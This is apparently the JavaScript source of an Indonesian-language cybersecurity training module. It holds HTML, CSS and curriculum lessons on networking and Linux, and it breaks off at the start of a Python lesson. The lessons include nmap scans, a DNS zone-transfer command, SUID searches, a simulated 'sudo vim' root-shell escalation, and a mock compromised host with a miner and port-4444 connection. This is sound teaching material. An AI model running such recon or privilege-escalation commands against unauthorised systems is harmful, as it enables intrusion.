// ================================================================
// CYBER SECURITY TRAINER v2 — Complete Module for TypeCraft
// Mengikuti pola html-trainer.js
//
// Integrasi otomatis:
//   <script src="cyber-trainer-v2.js"></script>
// ================================================================
'use strict';

// ================================================================
// INJECT PAGE HTML
// ================================================================
(function injectCyberV2Page() {
  const main = document.querySelector('.main');
  if (!main) { console.error('CyberV2: .main not found'); return; }
  if (document.getElementById('page-cyberv2')) return;

  const pageDiv = document.createElement('div');
  pageDiv.className = 'page';
  pageDiv.id = 'page-cyberv2';
  pageDiv.innerHTML = `
<!-- ═══ CYBER SECURITY TRAINER v2 ═══ -->
<div class="cv-header">
  <div class="cv-title-row">
    <div>
      <h2 class="section-title" style="margin-bottom:4px">🔐 Cyber Security Trainer</h2>
      <div style="font-size:13px;color:var(--text3)">17 Topik · Pemula → Profesional · Materi · Lab · Quiz · Challenge</div>
    </div>
    <div class="cv-header-stats">
      <div class="cv-stat-pill"><span id="cv-xp-display">0</span> XP</div>
      <div class="cv-stat-pill">🔥 <span id="cv-streak-display">0</span></div>
      <div class="cv-stat-pill">Lv <span id="cv-level-display">1</span></div>
      <div class="cv-stat-pill" id="cv-rank-pill">Script Kiddie</div>
    </div>
  </div>
  <div class="cv-xp-bar-wrap">
    <div class="cv-xp-bar" id="cv-xp-bar" style="width:0%"></div>
  </div>
  <div style="display:flex;justify-content:space-between;font-size:11px;color:var(--text3);margin-top:4px">
    <span id="cv-rank-label">Script Kiddie</span>
    <span><span id="cv-xp-cur">0</span> / <span id="cv-xp-next">300</span> XP to next rank</span>
  </div>
</div>

<!-- Daily Challenge Banner -->
<div class="cv-daily-banner" id="cv-daily-banner">
  <span style="font-size:24px">🎯</span>
  <div>
    <div style="font-weight:700;color:#5de0a0;font-size:14px" id="cv-daily-title">Daily Cyber Challenge</div>
    <div style="font-size:12px;color:var(--text2)" id="cv-daily-desc">Selesaikan tantangan hari ini untuk bonus XP!</div>
  </div>
  <button class="btn btn-primary btn-sm" style="margin-left:auto" onclick="cvStartDailyChallenge()">Mulai</button>
</div>

<!-- Main Layout -->
<div class="cv-layout">
  <!-- LEFT: Sidebar Kurikulum -->
  <div class="cv-sidebar" id="cv-sidebar">
    <div style="font-size:11px;font-weight:700;color:var(--text3);text-transform:uppercase;letter-spacing:.08em;padding:10px 14px 6px">Roadmap Kurikulum</div>
    <div id="cv-curriculum-list"></div>
  </div>

  <!-- RIGHT: Konten -->
  <div class="cv-content" id="cv-content">

    <!-- Welcome Screen -->
    <div id="cv-welcome-screen">
      <div class="cv-hero-card">
        <div style="font-size:48px;margin-bottom:12px">🔐</div>
        <h3 style="font-size:22px;font-weight:700;margin-bottom:8px">Selamat Datang di Cyber Security Trainer!</h3>
        <p style="color:var(--text2);font-size:14px;line-height:1.7;max-width:520px;margin:0 auto 20px">
          Pelajari cyber security dari nol hingga profesional. Setiap topik dilengkapi materi, contoh command, terminal simulator, quiz, dan challenge nyata.
        </p>
        <div style="display:flex;gap:10px;justify-content:center;flex-wrap:wrap">
          <button class="btn btn-primary" onclick="cvStartFromBeginning()">🚀 Mulai dari Awal</button>
          <button class="btn btn-ghost" onclick="cvContinueLearning()">▶ Lanjutkan Belajar</button>
        </div>
      </div>
      <div class="cv-progress-grid" id="cv-progress-overview"></div>
    </div>

    <!-- Lesson Screen -->
    <div id="cv-lesson-screen" style="display:none">
      <!-- Lesson Nav -->
      <div class="cv-lesson-nav">
        <button class="btn btn-ghost btn-sm" onclick="cvPrevLesson()">← Prev</button>
        <div style="text-align:center">
          <div style="font-size:12px;color:var(--text3)" id="cv-lesson-breadcrumb">Tahap 1 · Fondasi</div>
          <div style="font-size:15px;font-weight:700" id="cv-lesson-title">Networking</div>
        </div>
        <button class="btn btn-ghost btn-sm" onclick="cvNextLesson()">Next →</button>
      </div>

      <!-- Badges -->
      <div style="display:flex;align-items:center;gap:8px;margin-bottom:20px;flex-wrap:wrap">
        <span class="difficulty-badge" id="cv-diff-badge">Beginner</span>
        <span class="cv-topic-badge" id="cv-topic-badge">Fondasi</span>
        <span style="margin-left:auto;font-size:12px;color:var(--text3)" id="cv-lesson-progress-text">Topik 1 dari 4</span>
      </div>

      <!-- Tabs -->
      <div class="cv-tabs" id="cv-tabs">
        <button class="cv-tab active" onclick="cvSwitchTab('explain',this)">📖 Materi</button>
        <button class="cv-tab" onclick="cvSwitchTab('example',this)">💻 Command</button>
        <button class="cv-tab" onclick="cvSwitchTab('terminal',this)">🖥️ Terminal</button>
        <button class="cv-tab" onclick="cvSwitchTab('quiz',this)">🧠 Quiz</button>
        <button class="cv-tab" onclick="cvSwitchTab('challenge',this)">🏆 Challenge</button>
      </div>

      <!-- Tab: Materi -->
      <div id="cv-tab-explain" class="cv-tab-content active">
        <div class="cv-lesson-card" id="cv-explain-content"></div>
      </div>

      <!-- Tab: Command -->
      <div id="cv-tab-example" class="cv-tab-content">
        <div class="cv-lesson-card" id="cv-example-content"></div>
      </div>

      <!-- Tab: Terminal Simulator -->
      <div id="cv-tab-terminal" class="cv-tab-content">
        <div class="cv-terminal-wrap">
          <div class="cv-panel-header">
            <span class="panel-dot red"></span><span class="panel-dot yellow"></span><span class="panel-dot green"></span>
            <span style="margin-left:8px;font-size:12px;color:#5de0a0;font-family:var(--font-mono)" id="cv-terminal-label">kali@linux:~#</span>
            <div style="margin-left:auto;display:flex;gap:6px">
              <button class="btn btn-ghost btn-sm" onclick="cvRunTerminal()">▶ Run</button>
              <button class="btn btn-ghost btn-sm" onclick="cvClearTerminal()">Clear</button>
            </div>
          </div>
          <textarea id="cv-terminal-input" class="cv-code-editor" spellcheck="false" autocorrect="off" autocapitalize="off"
            placeholder="Ketik command di sini, lalu klik Run..."></textarea>
          <div class="cv-terminal-output" id="cv-terminal-output">
            <div class="cv-term-line"><span class="cv-prompt">root@kali:~#</span> <span class="cv-term-dim">Ketik command dan klik Run untuk simulasi output...</span></div>
          </div>
        </div>
        <!-- Typing Mode -->
        <div style="margin-top:14px">
          <div style="font-size:12px;font-weight:700;color:var(--text3);margin-bottom:8px">⌨️ Typing Practice — Ketik ulang command ini:</div>
          <div id="cv-typing-display" class="cv-typing-display"></div>
          <input type="text" id="cv-typing-input" class="typing-input" placeholder="Mulai ketik command..." oninput="cvHandleTyping(event)" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" style="margin-top:10px">
          <div class="typing-stats-bar" style="margin-top:10px">
            <div class="ts-item"><div class="ts-val" id="cv-t-wpm">0</div><div class="ts-label">WPM</div></div>
            <div class="ts-item"><div class="ts-val" id="cv-t-acc">100%</div><div class="ts-label">Accuracy</div></div>
            <div class="ts-item"><div class="ts-val" id="cv-t-prog">0%</div><div class="ts-label">Progress</div></div>
          </div>
        </div>
      </div>

      <!-- Tab: Quiz -->
      <div id="cv-tab-quiz" class="cv-tab-content">
        <div class="cv-lesson-card" id="cv-quiz-content"></div>
      </div>

      <!-- Tab: Challenge -->
      <div id="cv-tab-challenge" class="cv-tab-content">
        <div class="cv-lesson-card" id="cv-challenge-content"></div>
      </div>

      <!-- Complete Button -->
      <div style="display:flex;gap:10px;margin-top:20px;flex-wrap:wrap">
        <button class="btn btn-primary" onclick="cvCompleteLesson()" id="cv-complete-btn">✅ Selesai & Lanjut</button>
        <button class="btn btn-ghost" onclick="cvNextLesson()">Lewati →</button>
        <div id="cv-lesson-complete-badge" style="display:none;align-items:center;gap:6px;background:rgba(93,224,160,0.1);border:1px solid rgba(93,224,160,0.2);padding:6px 14px;border-radius:20px;font-size:12px;color:var(--green)">
          ✓ Topik ini sudah diselesaikan
        </div>
      </div>
    </div>

  </div><!-- /cv-content -->
</div><!-- /cv-layout -->
`;
  main.appendChild(pageDiv);
  console.log('CyberV2: Page injected ✓');
})();

// ================================================================
// INJECT CSS
// ================================================================
(function injectCyberV2CSS() {
  const style = document.createElement('style');
  style.textContent = `
/* ── CYBER TRAINER v2 STYLES ── */
#page-cyberv2{display:none;flex-direction:column;gap:14px}
#page-cyberv2.active{display:flex}

.cv-header{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius-lg);padding:20px 24px}
.cv-title-row{display:flex;align-items:flex-start;justify-content:space-between;gap:12px;margin-bottom:14px;flex-wrap:wrap}
.cv-header-stats{display:flex;gap:8px;flex-wrap:wrap}
.cv-stat-pill{background:var(--bg3);border:1px solid var(--border);padding:5px 12px;border-radius:20px;font-size:12px;font-weight:600;font-family:var(--font-data)}
.cv-xp-bar-wrap{background:var(--bg3);border-radius:4px;height:6px;overflow:hidden}
.cv-xp-bar{height:100%;background:linear-gradient(90deg,#5de0a0,#60a5fa);transition:width .5s ease}

.cv-daily-banner{display:flex;align-items:center;gap:14px;background:linear-gradient(135deg,rgba(93,224,160,.08),rgba(96,165,250,.05));border:1px solid rgba(93,224,160,.2);border-radius:var(--radius);padding:14px 18px;flex-wrap:wrap}

.cv-layout{display:grid;grid-template-columns:230px 1fr;gap:16px;align-items:start}
@media(max-width:900px){.cv-layout{grid-template-columns:1fr}}

.cv-sidebar{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden;position:sticky;top:72px;max-height:calc(100vh - 100px);overflow-y:auto}
.cv-level-item{border-bottom:1px solid var(--border);overflow:hidden}
.cv-level-header{padding:10px 14px;cursor:pointer;display:flex;align-items:center;gap:8px;font-size:12px;font-weight:700;color:var(--text2);transition:background .15s;user-select:none}
.cv-level-header:hover{background:var(--bg3)}
.cv-level-header.open{color:var(--green)}
.cv-level-topics{display:none;padding:4px 0}
.cv-level-topics.open{display:block}
.cv-topic-item{padding:7px 14px 7px 28px;font-size:12px;color:var(--text3);cursor:pointer;transition:all .15s;display:flex;align-items:center;gap:6px;border-left:2px solid transparent}
.cv-topic-item:hover{color:var(--text);background:var(--bg3)}
.cv-topic-item.active{color:#5de0a0;background:rgba(93,224,160,.08);border-left-color:#5de0a0}
.cv-topic-item.completed::before{content:'✓';color:var(--green);margin-right:2px;font-size:10px}
.cv-topic-progress{font-size:10px;color:var(--text3);margin-left:auto}

.cv-content{min-height:400px}
.cv-hero-card{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius-lg);padding:40px 32px;text-align:center;margin-bottom:20px}
.cv-progress-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:10px}
.cv-progress-card{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);padding:14px;text-align:center;cursor:pointer;transition:all .2s}
.cv-progress-card:hover{transform:translateY(-2px);border-color:rgba(93,224,160,.3)}
.cv-progress-card .pc-icon{font-size:22px;margin-bottom:6px}
.cv-progress-card .pc-name{font-size:11px;font-weight:600;margin-bottom:4px}
.cv-progress-card .pc-bar-wrap{background:var(--bg3);border-radius:3px;height:4px;overflow:hidden}
.cv-progress-card .pc-bar{height:100%;background:linear-gradient(90deg,#5de0a0,#60a5fa);transition:width .5s}
.cv-progress-card .pc-pct{font-size:10px;color:var(--text3);margin-top:3px}

.cv-lesson-nav{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;padding:12px 16px;background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius)}
.cv-topic-badge{background:rgba(93,224,160,.1);color:#5de0a0;border:1px solid rgba(93,224,160,.2);padding:3px 10px;border-radius:20px;font-size:11px;font-weight:600;font-family:var(--font-mono)}

.cv-tabs{display:flex;gap:4px;background:var(--bg2);padding:4px;border-radius:10px;border:1px solid var(--border);margin-bottom:16px;flex-wrap:wrap}
.cv-tab{padding:6px 14px;border-radius:8px;font-size:12px;font-weight:600;cursor:pointer;transition:all .2s;color:var(--text2);background:transparent;border:none;font-family:var(--font-ui)}
.cv-tab:hover{color:var(--text);background:var(--bg3)}
.cv-tab.active{background:#5de0a0;color:#0d1a14}
.cv-tab-content{display:none}
.cv-tab-content.active{display:block}

.cv-lesson-card{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius-lg);padding:24px 28px;line-height:1.8}
.cv-lesson-card h3{font-size:18px;font-weight:700;margin-bottom:14px;color:var(--text)}
.cv-lesson-card h4{font-size:14px;font-weight:700;margin:16px 0 8px;color:#5de0a0}
.cv-lesson-card p{margin-bottom:12px;color:var(--text2);font-size:14px}
.cv-lesson-card ul,.cv-lesson-card ol{padding-left:22px;margin-bottom:12px;color:var(--text2);font-size:14px}
.cv-lesson-card li{margin-bottom:6px}
.cv-lesson-card code{background:var(--bg3);border:1px solid var(--border);padding:2px 6px;border-radius:4px;font-family:var(--font-mono);font-size:12px;color:#5de0c5}
.cv-lesson-card pre{background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:16px;font-family:var(--font-mono);font-size:12px;overflow-x:auto;white-space:pre-wrap;color:#c8ffd4;line-height:1.7;margin:12px 0}

.cv-tip-box{background:rgba(93,224,160,.06);border:1px solid rgba(93,224,160,.2);border-radius:8px;padding:10px 14px;font-size:13px;color:var(--text2);margin:12px 0;display:flex;gap:8px;align-items:flex-start}
.cv-warn-box{background:rgba(247,185,106,.06);border:1px solid rgba(247,185,106,.2);border-radius:8px;padding:10px 14px;font-size:13px;color:var(--text2);margin:12px 0;display:flex;gap:8px;align-items:flex-start}
.cv-danger-box{background:rgba(247,106,106,.06);border:1px solid rgba(247,106,106,.2);border-radius:8px;padding:10px 14px;font-size:13px;color:var(--text2);margin:12px 0;display:flex;gap:8px;align-items:flex-start}

.cv-command-block{background:#0a0e12;border:1px solid #1e2a1e;border-radius:8px;padding:14px 18px;font-family:var(--font-mono);font-size:13px;color:#5de0a0;margin:12px 0;position:relative;white-space:pre-wrap;line-height:1.7}
.cv-command-copy{position:absolute;top:8px;right:8px;background:var(--bg3);border:1px solid var(--border);padding:3px 8px;border-radius:4px;font-size:11px;cursor:pointer;color:var(--text2)}
.cv-command-copy:hover{color:var(--text)}

.cv-terminal-wrap{background:#0a0e12;border:1px solid #1e2a1e;border-radius:var(--radius-lg);overflow:hidden}
.cv-panel-header{display:flex;align-items:center;padding:8px 12px;border-bottom:1px solid #1e2a1e;background:#0d1117;gap:6px}
.cv-code-editor{width:100%;background:#0d1117;border:none;border-bottom:1px solid #1e2a1e;padding:14px 16px;font-family:var(--font-mono);font-size:13px;color:#5de0a0;outline:none;resize:none;min-height:100px;caret-color:#5de0a0;line-height:1.7}
.cv-code-editor::placeholder{color:#2a4a2a}
.cv-terminal-output{padding:14px 16px;min-height:140px;max-height:280px;overflow-y:auto;font-family:var(--font-mono);font-size:12px;line-height:1.8}
.cv-term-line{margin-bottom:2px;display:flex;gap:8px;flex-wrap:wrap}
.cv-prompt{color:#5de0a0;font-weight:700;flex-shrink:0}
.cv-term-out{color:#c8ffd4}
.cv-term-err{color:#f76a6a}
.cv-term-info{color:#60a5fa}
.cv-term-warn{color:#f7b96a}
.cv-term-dim{color:#2a4a2a}

.cv-typing-display{background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:14px 16px;font-family:var(--font-mono);font-size:13px;line-height:1.9;min-height:60px;word-break:break-all}
.cv-typing-display .char.correct{color:#5de0a0}
.cv-typing-display .char.wrong{color:#f76a6a;background:rgba(247,106,106,.15);border-radius:2px}
.cv-typing-display .char.current{color:var(--text);border-bottom:2px solid #5de0a0}
.cv-typing-display .char.pending{color:var(--text3)}

.cv-quiz-option{display:block;width:100%;text-align:left;padding:12px 16px;margin-bottom:8px;background:var(--bg3);border:1px solid var(--border);border-radius:8px;cursor:pointer;font-size:13px;color:var(--text2);transition:all .2s;font-family:var(--font-ui)}
.cv-quiz-option:hover{background:var(--bg2);color:var(--text);border-color:rgba(93,224,160,.3)}
.cv-quiz-option.correct{background:rgba(93,224,160,.1);border-color:#5de0a0;color:#5de0a0}
.cv-quiz-option.wrong{background:rgba(247,106,106,.1);border-color:#f76a6a;color:#f76a6a}
.cv-quiz-result{padding:12px 16px;border-radius:8px;font-size:13px;margin-top:10px;line-height:1.6}
.cv-quiz-result.pass{background:rgba(93,224,160,.08);border:1px solid rgba(93,224,160,.2);color:#5de0a0}
.cv-quiz-result.fail{background:rgba(247,106,106,.08);border:1px solid rgba(247,106,106,.2);color:#f76a6a}

.cv-challenge-editor{width:100%;background:#0d1117;border:1px solid #1e2a1e;padding:14px;font-family:var(--font-mono);font-size:12px;color:#5de0a0;border-radius:8px;outline:none;resize:vertical;min-height:180px;line-height:1.7}
.cv-challenge-output{background:#0a0e12;border:1px solid #1e2a1e;border-radius:8px;padding:14px;font-family:var(--font-mono);font-size:12px;color:#c8ffd4;min-height:100px;line-height:1.8;white-space:pre-wrap}

.cv-badge-popup{position:fixed;bottom:80px;left:50%;transform:translateX(-50%) translateY(20px);background:linear-gradient(135deg,#5de0a0,#60a5fa);color:#0d1a14;padding:12px 24px;border-radius:24px;font-weight:700;font-size:14px;z-index:999;opacity:0;transition:all .4s;pointer-events:none}
.cv-badge-popup.show{opacity:1;transform:translateX(-50%) translateY(0)}

@keyframes cv-blink{0%,100%{opacity:1}50%{opacity:0}}
`;
  document.head.appendChild(style);
})();

// ================================================================
// CURRICULUM DATA — 17 Topik Lengkap
// ================================================================
const CV_CURRICULUM = [

  // ════════════════════════════════════════════════════════════
  // TAHAP 1: FONDASI (4 topik)
  // ════════════════════════════════════════════════════════════
  {
    id: 1, name: 'Fondasi IT', icon: '🖥️', color: '#5de0a0',
    topics: [
      {
        id: 'f1', title: 'Networking Dasar', diff: 'beginner',
        explain: `
<h3>Mengapa Networking adalah Fondasi Cyber Security?</h3>
<p>Semua serangan dan pertahanan siber terjadi melalui jaringan. Tanpa memahami bagaimana data berpindah dari satu titik ke titik lain, kamu tidak akan bisa memahami cara kerja serangan maupun cara mencegahnya.</p>
<h4>🔷 Model OSI — 7 Layer</h4>
<ul>
  <li><code>Layer 7 - Application</code> → HTTP, DNS, FTP, SMTP — tempat serangan XSS, SQLi, Phishing</li>
  <li><code>Layer 6 - Presentation</code> → Enkripsi/dekripsi data, SSL stripping</li>
  <li><code>Layer 5 - Session</code> → Manajemen sesi, session hijacking</li>
  <li><code>Layer 4 - Transport</code> → TCP/UDP, port scanning, SYN flood</li>
  <li><code>Layer 3 - Network</code> → IP address, routing, IP spoofing, ICMP flood</li>
  <li><code>Layer 2 - Data Link</code> → MAC address, ARP spoofing, VLAN hopping</li>
  <li><code>Layer 1 - Physical</code> → Kabel, sinyal, hardware keylogger</li>
</ul>
<h4>🔷 Protokol Wajib Hafal</h4>
<ul>
  <li><code>HTTP :80</code> — Web tidak terenkripsi (bisa disadap!)</li>
  <li><code>HTTPS :443</code> — Web terenkripsi TLS</li>
  <li><code>SSH :22</code> — Remote akses aman</li>
  <li><code>FTP :21</code> — Transfer file (tidak aman, pakai SFTP)</li>
  <li><code>DNS :53</code> — Resolusi domain ke IP</li>
  <li><code>RDP :3389</code> — Remote Desktop Windows (sering diserang bruteforce!)</li>
  <li><code>SMB :445</code> — File sharing Windows (EternalBlue!)</li>
  <li><code>SMTP :25</code> — Kirim email</li>
</ul>
<h4>🔷 TCP vs UDP</h4>
<ul>
  <li><strong>TCP</strong> — Ada 3-way handshake (SYN→SYN-ACK→ACK), reliable, dipakai HTTP/SSH/FTP</li>
  <li><strong>UDP</strong> — Tidak ada handshake, cepat, dipakai DNS/VoIP/Gaming</li>
</ul>
<div class="cv-tip-box">💡 <span>Mulai dari sini: install Wireshark dan capture traffic jaringanmu sendiri. Lihat setiap paket yang masuk-keluar dari komputermu!</span></div>
<div class="cv-warn-box">⚠️ <span>Jangan pernah capture traffic jaringan orang lain tanpa izin. Ini ilegal di sebagian besar negara termasuk Indonesia (UU ITE).</span></div>
`,
        commands: `# ─── PERINTAH NETWORKING WAJIB ───────────────────────────────

# Lihat konfigurasi IP sendiri
ifconfig          # Linux/Mac
ipconfig /all     # Windows

# Ping — cek apakah host aktif
ping 8.8.8.8
ping google.com -c 4      # Linux: 4 packet saja

# Traceroute — lacak jalur paket ke tujuan
traceroute google.com     # Linux/Mac
tracert google.com        # Windows

# DNS lookup
nslookup google.com
dig google.com
dig google.com MX         # cek mail server
dig axfr @ns1.target.com target.com  # zone transfer (pentest)

# Lihat koneksi aktif
netstat -an
ss -tulpn                 # lebih modern di Linux

# Scan port dengan nmap
nmap -sV -sC 192.168.1.1          # scan 1 host
nmap -sn 192.168.1.0/24           # host discovery saja
nmap -p 80,443,22,21 192.168.1.1  # scan port tertentu
nmap -p- -T4 192.168.1.1          # scan semua 65535 port

# Capture traffic
tcpdump -i eth0 -n             # semua traffic
tcpdump -i eth0 port 80        # filter HTTP saja
tcpdump -i eth0 -w hasil.pcap  # simpan ke file`,
        simulation: [
          { input: 'nmap -sV 192.168.1.1', output: `Starting Nmap scan...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1
80/tcp   open  http    Apache httpd 2.4.41
443/tcp  open  https   nginx 1.18.0
3306/tcp open  mysql   MySQL 5.7.32
Nmap done: 1 IP address scanned in 15.3s`, type: 'info' },
          { input: 'ping -c 3 google.com', output: `PING google.com (142.250.185.78)
64 bytes from 142.250.185.78: icmp_seq=1 ttl=117 time=12.4 ms
64 bytes from 142.250.185.78: icmp_seq=2 ttl=117 time=11.8 ms
64 bytes from 142.250.185.78: icmp_seq=3 ttl=117 time=12.1 ms
--- google.com ping statistics ---
3 packets transmitted, 3 received, 0% packet loss`, type: 'out' },
          { input: 'dig google.com', output: `; <<>> DiG 9.16.1 <<>> google.com
;; ANSWER SECTION:
google.com. 299 IN A 142.250.185.78
;; Query time: 14 msec
;; SERVER: 8.8.8.8#53(8.8.8.8)`, type: 'out' },
        ],
        typingTarget: 'nmap -sV -sC -p- -T4 --open 192.168.1.100 -oN hasil_scan.txt',
        quiz: {
          q: 'Port berapa yang digunakan oleh SSH?',
          options: ['Port 21', 'Port 22', 'Port 23', 'Port 80'],
          correct: 1,
          explanation: 'SSH (Secure Shell) menggunakan port 22 secara default. Port 21 adalah FTP, port 23 adalah Telnet (tidak aman), port 80 adalah HTTP.',
        },
        challenge: {
          title: 'Identifikasi Serangan dari Log Nmap',
          desc: 'Analisis output nmap berikut dan jawab pertanyaan: port apa yang berpotensi menjadi celah keamanan dan mengapa?',
          starter: `# Output nmap yang perlu dianalisis:
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.3.4
22/tcp   open  ssh     OpenSSH 4.7
23/tcp   open  telnet  Linux telnetd
80/tcp   open  http    Apache 2.2.8
3306/tcp open  mysql   MySQL 5.0.51a
5900/tcp open  vnc     VNC protocol 3.3

# Tugas:
# 1. Tuliskan port mana yang PALING berbahaya dan alasannya
# 2. Port mana yang harusnya ditutup sama sekali?
# 3. Service mana yang memiliki CVE berbahaya?

# Jawaban saya:
# Port paling berbahaya: 
# Alasan: 
# Port yang harus ditutup: 
# Service dengan CVE berbahaya: `,
          hint: 'vsftpd 2.3.4 memiliki backdoor terkenal (CVE-2011-2523). Telnet mengirim data tanpa enkripsi. Port 5900 VNC sering tidak berpassword.',
          answerCheck: ['21', 'vsftpd', 'telnet', 'vnc'],
        },
        xp: 80,
      },
      {
        id: 'f2', title: 'Sistem Operasi Linux', diff: 'beginner',
        explain: `
<h3>Mengapa Linux Wajib untuk Cyber Security?</h3>
<p>90% server di dunia menggunakan Linux. Tools cyber security terbaik berjalan di Linux. Kali Linux adalah distro khusus pentest yang dipakai jutaan security profesional. Tanpa Linux, kamu tidak bisa jadi security professional.</p>
<h4>🔷 Perintah Linux Dasar yang Wajib Dikuasai</h4>
<ul>
  <li><code>ls -la</code> — list semua file termasuk hidden (awalan dot)</li>
  <li><code>cd /path</code> — pindah direktori</li>
  <li><code>cat file</code> — tampilkan isi file</li>
  <li><code>grep "kata" file</code> — cari teks dalam file</li>
  <li><code>find / -name "*.conf"</code> — cari file di seluruh sistem</li>
  <li><code>chmod 755 file</code> — ubah permission file</li>
  <li><code>ps aux</code> — lihat semua proses berjalan</li>
  <li><code>kill -9 PID</code> — paksa hentikan proses</li>
</ul>
<h4>🔷 File Penting di Linux untuk Security</h4>
<ul>
  <li><code>/etc/passwd</code> — Daftar semua user (bisa dibaca semua user)</li>
  <li><code>/etc/shadow</code> — Password hash (hanya bisa dibaca root!)</li>
  <li><code>/etc/sudoers</code> — Siapa yang boleh pakai sudo</li>
  <li><code>/var/log/auth.log</code> — Log autentikasi dan login</li>
  <li><code>/var/log/syslog</code> — Log sistem</li>
  <li><code>/tmp</code> — Direktori temporary (sering dipakai attacker!)</li>
  <li><code>~/.bash_history</code> — Riwayat command terminal</li>
</ul>
<h4>🔷 Permission Linux</h4>
<p>Format: <code>-rwxr-xr-x</code> → owner(rwx) group(r-x) others(r-x)</p>
<ul>
  <li><code>r=4</code> read, <code>w=2</code> write, <code>x=1</code> execute</li>
  <li><code>chmod 777</code> = rwxrwxrwx = BAHAYA! Semua orang bisa akses</li>
  <li><code>chmod 600</code> = rw------- = Hanya owner bisa baca/tulis (bagus untuk private key!)</li>
</ul>
<div class="cv-tip-box">💡 <span>Install VirtualBox + Kali Linux SEKARANG. Download gratis di kali.org. Ini adalah investasi terpenting yang bisa kamu lakukan.</span></div>
`,
        commands: `# ─── LINUX UNTUK CYBER SECURITY ─────────────────────────────

# Navigasi dasar
pwd                        # direktori sekarang
ls -la                     # list semua file + hidden
cd /var/log                # masuk ke log directory
cat /etc/passwd            # lihat daftar user

# Cari file berbahaya / menarik
find / -perm -4000 -type f 2>/dev/null    # cari file SUID (privesc!)
find / -writable -user root 2>/dev/null   # file root yang bisa ditulis
find /tmp -type f -mtime -1               # file baru di /tmp (last 24h)
ls -la /home/*/                           # lihat home semua user

# Log analysis
cat /var/log/auth.log | grep "Failed"     # login gagal
grep "Accepted" /var/log/auth.log         # login sukses
tail -f /var/log/auth.log                 # monitor real-time
last -n 20                                # 20 login terakhir
lastb | head -20                          # login yang gagal

# Proses dan koneksi
ps aux | grep -v root      # proses bukan root
netstat -tulpn             # port yang terbuka + program
ss -tulpn                  # alternatif netstat yang lebih baru
lsof -i :80                # siapa yang pakai port 80?

# User management
whoami                     # siapa kamu?
id                         # detail user dan group
sudo -l                    # apa yang boleh kamu lakukan sebagai sudo?
cat /etc/sudoers           # konfigurasi sudo

# Bash scripting dasar
#!/bin/bash
for ip in 192.168.1.{1..254}; do
  ping -c 1 -W 1 $ip &>/dev/null && echo "$ip is up"
done`,
        simulation: [
          { input: 'find / -perm -4000 -type f 2>/dev/null', output: `[*] Mencari file SUID...
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/pkexec
/usr/local/bin/custom_backup  ← MENCURIGAKAN!
/usr/bin/newgrp
[!] File /usr/local/bin/custom_backup: SUID bit aktif, owner: root`, type: 'warn' },
          { input: 'cat /var/log/auth.log | grep "Failed" | tail -5', output: `Dec 15 10:22:01 sshd: Failed password for root from 185.220.101.12 port 54321
Dec 15 10:22:03 sshd: Failed password for root from 185.220.101.12 port 54322
Dec 15 10:22:05 sshd: Failed password for root from 185.220.101.12 port 54323
[!] PERINGATAN: 847 percobaan login gagal dari 185.220.101.12
[!] Kemungkinan: BRUTE FORCE ATTACK!`, type: 'err' },
          { input: 'sudo -l', output: `Matching Defaults entries for www-data:
    env_reset, mail_badpass
User www-data may run the following commands:
    (ALL) NOPASSWD: /usr/bin/vim
[!] CELAH: sudo vim bisa dipakai untuk privesc!
[*] Coba: sudo vim -c ':!/bin/bash'`, type: 'warn' },
        ],
        typingTarget: 'find / -perm -4000 -type f 2>/dev/null | grep -v "^/proc"',
        quiz: {
          q: 'File mana di Linux yang menyimpan password hash dan HANYA bisa dibaca oleh root?',
          options: ['/etc/passwd', '/etc/shadow', '/etc/sudoers', '/var/log/auth.log'],
          correct: 1,
          explanation: '/etc/shadow menyimpan password hash. /etc/passwd bisa dibaca semua user tapi tidak berisi password sebenarnya. Ini adalah target utama setelah mendapat akses root.',
        },
        challenge: {
          title: 'Analisis Sistem yang Terkompromi',
          desc: 'Berdasarkan output perintah berikut, tentukan apakah sistem ini sudah dikompromi. Jelaskan temuanmu.',
          starter: `# OUTPUT INVESTIGASI:

# 1. Proses mencurigakan:
ps aux:
root  1337  99.9  /tmp/.hidden_miner --pool mining.pool.io:3333

# 2. File baru di /tmp:
ls -la /tmp:
-rwxr-xr-x root  /tmp/.hidden_miner
-rw-r--r-- root  /tmp/.bash (ukuran: 2.4MB)
drwxrwxrwx root  /tmp/.secret/

# 3. Koneksi jaringan:
netstat -an:
tcp  0.0.0.0:22   LISTEN
tcp  192.168.1.5:51234 > 185.220.101.99:4444  ESTABLISHED

# 4. Crontab root:
* * * * * /tmp/.hidden_miner --quiet

# Analisis saya:
# 1. Apakah sistem ini sudah dikompromi? (Ya/Tidak)
# 2. Apa yang dilakukan attacker?
# 3. Bagaimana attacker mendapat persistence?
# 4. Langkah mitigasi apa yang harus dilakukan?`,
          hint: 'Port 4444 adalah port default Metasploit reverse shell. File di /tmp yang executable + crontab = persistence mechanism.',
          answerCheck: ['ya', '4444', 'crontab', 'mining'],
        },
        xp: 90,
      },
      {
        id: 'f3', title: 'Python untuk Hacking', diff: 'beginner',
        explain: `
<h3>Mengapa Python adalah Bahasa Wajib Security Professional?</h3>
<p>Python adalah bahasa nomor 1 di dunia cyber security. Hampir semua tools modern ditulis dengan Python: Metasploit modules, OWASP tools, exploit PoC, automation script. Menguasai Python = bisa buat tools sendiri.</p>
<h4>🔷 Konsep Python yang Wajib untuk Security</h4>
<ul>
  <li><code>socket</code> — Komunikasi jaringan TCP/UDP level rendah</li>
  <li><code>requests</code> — HTTP requests (web scraping, API testing)</li>
  <li><code>subprocess</code> — Jalankan command OS dari Python</li>
  <li><code>re</code> — Regular expression untuk parsing data</li>
  <li><code>hashlib</code> — Hashing (MD5, SHA256)</li>
  <li><code>threading</code> — Paralel execution (scan lebih cepat)</li>
</ul>
<h4>🔷 Skenario Penggunaan Python di Security</h4>
<ul>
